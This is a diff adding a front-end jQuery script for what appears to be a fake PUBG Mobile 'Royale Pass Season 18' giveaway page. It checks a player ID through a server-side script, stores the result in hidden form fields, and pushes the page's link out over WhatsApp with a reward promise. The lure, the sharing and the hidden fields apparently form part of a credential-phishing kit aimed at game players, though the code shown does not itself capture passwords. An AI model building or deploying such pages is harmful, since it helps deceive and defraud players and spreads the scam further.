@@ -1,0 +1,147 @@
+
+	var login = new Audio();
+	login.src = "media/login.mp3";
+
+	var tutup = new Audio();
+	tutup.src = "media/tutup.mp3";
+
+	var button = new Audio();
+	button.src = "media/button.mp3";
+
+	$(document).ready(function() {
+		$('#music_on').on('click',function(){
+        		var audio = $('#audio')[0];
+        		audio.play();
+        		$(this).hide();
+        		$('#music_off').show();
+        	});
+		$('#music_off').on('click',function(){
+        		var audio = $('#audio')[0];
+        		audio.pause();
+        		$(this).hide();
+        		$('#music_on').show();
+        	});
+	});
+	function change43() {
+		$('#reward4').fadeOut('slow');
+		$('#reward3').fadeIn('slow');
+	}
+	function change4() {
+		$('#reward3').fadeOut('slow');
+		$('#reward4').fadeIn('slow');
+	}
+	function change3() {
+		$('#reward2').fadeOut('slow');
+		$('#reward3').fadeIn('slow');
+	}
+	function change23() {
+		$('#reward3').fadeOut('slow');
+		$('#reward2').fadeIn('slow');
+	}
+	function change2() {
+		$('#reward1').fadeOut('slow');
+		$('#reward2').fadeIn('slow');
+	}
+	function change1() {
+		$('#reward2').fadeOut('slow');
+		$('#reward1').fadeIn('slow');
+	}
+	function close_share() {
+		$('.share').fadeOut('slow');
+	}
+	function share() {
+		$('.share').fadeIn('slow');
+	}
+
+
+        $(document).ready(function() {
+        	$('#shareWa').on('click',function(){
+        		var pageURL = location;
+        		document.location.href = 'whatsapp://send?text=Get reward PUBG MOBILE Royale Pass Season 18 here : '+pageURL;
+        	});
+        	
+        	$('#playid').on('click',function(){
+        		$('#errorId').hide();
+                $('#playid').css('border','1px solid #e2c73d');
+        	});
+            $("#verify").on('click', function() {
+               var playid = $("#playid").val();
+               if(playid == "") {
+                   $('#errorId').show();
+                   $('#playid').css('border','1px solid #fff');
+                   $('#playid').val('');
+               } else {
+                    $.ajax({
+                    url: "system/curl.php",
+                    type: "POST",
+                    data: 'playid='+playid,
+                    beforeSend: function() {
+                    $(".judulID").fadeOut();
+                    $(".titleId").fadeIn();
+                    $(".titleId").html('Please wait');
+                    $('#playid').fadeOut();
+                    $('.waitId').fadeIn();
+                    $('#verify').attr('disabled','true');
+                    $('.forgotId').attr('disabled','true');
+                    $('.forgotId').css('opacity','0.5');
+                    $('#verify').css('opacity','0.5');
+                    },
+                    success: function(status) {
+                    var stat = $('#status').val(status);
+                    var isi_stat = stat.val();
+                    $("#btn_oke").show();
+                    $("#btnload").hide();
+                    if (isi_stat == "Wrong_UserId") {
+                    	$('#verify').removeAttr('disabled');
+	                    $('.forgotId').removeAttr('disabled');
+	                    $('.forgotId').css('opacity','1');
+	                    $('#verify').css('opacity','1');
+                       $('.waitId').hide();
+                       $(".titleId").hide();
+                       $(".errorId").hide();
+                       $("#playid").fadeIn();
+                       $('#errorId').show();
+                   	   $('#playid').css('border','1px solid #fff');
+                       $('#errorId').html('invalid player id(2002-2002-0)‎');
+                    }else if(isi_stat == "Token Error"){
+                    	$('#verify').removeAttr('disabled');
+	                    $('.forgotId').removeAttr('disabled');
+	                    $('.forgotId').css('opacity','1');
+	                    $('#verify').css('opacity','1');
+                    	$('.waitId').hide()
+                       $(".titleId").hide();
+                       $(".errorId").hide();
+                       $("#playid").fadeIn();
+                       $('#errorId').show()
+                   	   $('#playid').css('border','1px solid #fff');
+                       $('#errorId').html('System error(2002-2002-0)‎');
+                    }else{
+                    	$('.waitId').hide()
+                    	$('.menuPubgm').fadeIn()
+                        $('#beer').hide();
+                        $('.alertPubgm').hide();
+                        $('.alertPubgm2').fadeIn();
+                        $('#valnickname').html(status);
+                        $('#isinick1').val(status);
+                        $('#isinick2').val(status);
+                        $('#isiplayid1').val(playid);
+                        $('#isiplayid2').val(playid);
+                        $('.playid').hide();
+                    }
+                    }
+                    });
+               }
+            });
+
+        });
+    
+
+	function forgot(){
+	$('.forgot').show();
+	$('.playid').hide();
+	}
+	function close_forgot(){
+		$(".forgot").hide()
+		$(".playid").show()
+	}
+	
